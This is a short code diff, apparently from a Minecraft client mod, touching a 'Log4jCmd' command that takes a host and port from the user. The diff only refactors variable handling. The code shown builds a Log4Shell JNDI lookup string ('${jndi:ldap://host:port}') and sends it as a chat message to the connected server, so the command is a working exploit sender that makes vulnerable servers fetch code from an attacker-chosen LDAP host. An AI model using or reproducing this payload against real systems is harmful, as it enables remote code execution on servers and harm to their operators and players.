@@ -22,9 +22,9 @@ public final class Log4jCmd extends Command {
         else if (Integer.parseInt(args[2]) > 65536 || Integer.parseInt(args[2]) < 1) {
             throw new CmdSyntaxError("端口号必须>1且<65536.");
         } else {
-            String host = args[1];
-            int port = Integer.parseInt(args[2]);
-            String payload = "${jndi:ldap://" + args[1] + ":" + args[2] + "}";
+            String host = String.valueOf(args[1]);
+            String port = String.valueOf(args[2]);
+            String payload = "${jndi:ldap://" + host + ":" + port + "}";
             CPacketChatMessage packet = new CPacketChatMessage(payload);
             mc.getConnection().sendPacket(packet);
         }
